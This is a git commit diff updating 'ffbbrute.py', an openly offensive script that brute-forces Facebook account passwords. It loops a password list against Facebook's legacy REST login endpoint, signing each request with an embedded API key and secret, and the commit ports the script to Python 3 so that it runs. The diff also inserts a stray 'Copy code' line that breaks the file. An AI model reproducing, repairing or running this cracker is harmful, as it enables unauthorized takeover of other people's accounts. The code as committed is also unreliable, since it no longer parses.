f3db4ead23d21626bdd0401569e344577cb42c03
Sandesh241 <154723341+Sandesh241@users.noreply.github.com>
2023-12-25 21:17:09 +0530

    Update ffbbrute.py

--- ffbbrute.py
+++ ffbbrute.py
@@ -1,6 +1,7 @@
+Copy code
 import os
 import sys
-import urllib
+import urllib.request
 import hashlib
 
 API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
@@ -24,10 +25,10 @@ __banner__ = """
 """
 
 print("[+] Facebook Brute Force\n")
-userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
+userid = input("[*] Enter [Email|Phone|Username|ID]: ")
 try:
-    passlist = raw_input("[*] Set PATH to passlist: ")
-    if os.path.exists(passlist) != False:
+    passlist = input("[*] Set PATH to passlist: ")
+    if os.path.exists(passlist):
         print(__banner__)
         print(" [+] Account to crack : {}".format(userid))
         print(" [+] Loaded : {}".format(len(open(passlist, "r").read().split("\n"))))
@@ -36,10 +37,10 @@ try:
             sys.stdout.write("\u001b[1000D[*] Trying {}".format(passwd.strip()))
             sys.stdout.flush()
             sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid, passwd.strip(), API_SECRET)
-            xx = hashlib.md5(sig).hexdigest()
+            xx = hashlib.md5(sig.encode()).hexdigest()
             data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid, passwd.strip(), xx)
-            response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
-            if "error" in response:
+            response = urllib.request.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
+            if "error" in response.decode():
                 pass
             else:
                 print("\n\n[+] Password found .. !!")
